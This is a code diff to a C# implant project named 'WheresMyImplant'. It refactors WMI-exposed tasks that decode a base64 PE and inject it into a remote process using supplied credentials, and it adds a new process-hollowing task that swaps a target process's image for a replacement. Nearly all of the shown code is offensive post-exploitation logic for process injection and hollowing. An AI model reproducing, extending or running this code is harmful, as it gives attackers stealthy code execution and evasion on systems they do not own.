@@ -173,7 +173,7 @@ namespace WheresMyImplant
         [ManagementTask]
         public static string InjectPEWMIFSRemote(Int32 processId, String wmiClass, String system, String username, String password, String fileName, String parameters)
         {
-            string output = "";
+            StringBuilder output = new StringBuilder();
 
             ConnectionOptions options = new ConnectionOptions();
 
@@ -200,7 +200,7 @@ namespace WheresMyImplant
                 }
             }
 
-            byte[] peBytes = System.Convert.FromBase64String(EncodedText);
+            Byte[] peBytes = System.Convert.FromBase64String(EncodedText);
             PELoader peLoader = new PELoader();
             peLoader.Execute(peBytes);
             InjectPERemote injectPE = new InjectPERemote((UInt32)processId, peLoader, parameters);
@@ -210,13 +210,13 @@ namespace WheresMyImplant
             }
             catch
             {
-                output = "[-] Execution Failed\n";
+                output.Append("[-] Execution Failed\n");
             }
             finally
             {
-                output += injectPE.GetOutput();
+                output.Append(injectPE.GetOutput());
             }
-            return output;
+            return output.ToString();
         }
 
         [ManagementTask]
@@ -229,47 +229,62 @@ namespace WheresMyImplant
             }
 
             HollowProcess hp = new HollowProcess();
-            if (!hp.CreateSuspendedProcess(target))//@"C:\Windows\notepad.exe"))
+            if (!hp.ReadSourceImageFile(replacement))
             {
-                return Misc.GetError();
+                return hp.GetOutput();
             }
 
-            if (!hp.ReadPEB())
+            if (!hp.CreateSuspendedProcess(target))
             {
-                return Misc.GetError();
-            }
-
-            if (!hp.GetTargetArch())
-            {
-                return Misc.GetError();
-            }
-
-            if (!hp.GetContext())
-            {
-                return Misc.GetError();
-            }
-
-            if (!hp.ReadNTHeaders())
-            {
-                return Misc.GetError();
-            }
-
-            if (!hp.ReadSourceImage(replacement))
-            {
-                return Misc.GetError();
+                return hp.GetOutput();
             }
 
             if (!hp.RemapImage())
             {
-                return Misc.GetError();
+                return hp.GetOutput();
             }
 
-            if (!hp.ResumeProcess64(bWait))
+            if (!hp.ResumeProcess(bWait))
             {
-                return Misc.GetError();
+                return hp.GetOutput();
             }
 
-            return "Process Hollowed";
+            return hp.GetOutput() + "\nProcess Hollowed";
+        }
+
+        [ManagementTask]
+        public static String HollowProcessString(String target, String replacement, String wait)
+        {
+            Boolean bWait;
+            if (!Boolean.TryParse(wait, out bWait))
+            {
+                return "Unable to parse wait parameter (true, false)";
+            }
+
+            StringBuilder output = new StringBuilder();
+            HollowProcess hp = new HollowProcess();
+            if (!hp.ReadSourceImageString(replacement))
+            {
+                return output.ToString();
+            }
+
+            if (!hp.CreateSuspendedProcess(target))
+            {
+                return output.ToString();
+            }
+
+            if (!hp.RemapImage())
+            {
+                return output.ToString();
+            }
+
+            if (!hp.ResumeProcess(bWait))
+            {
+                return output.ToString();
+            }
+
+            output.Append("Process Hollowed");
+            return output.ToString();
         }
     }
 }
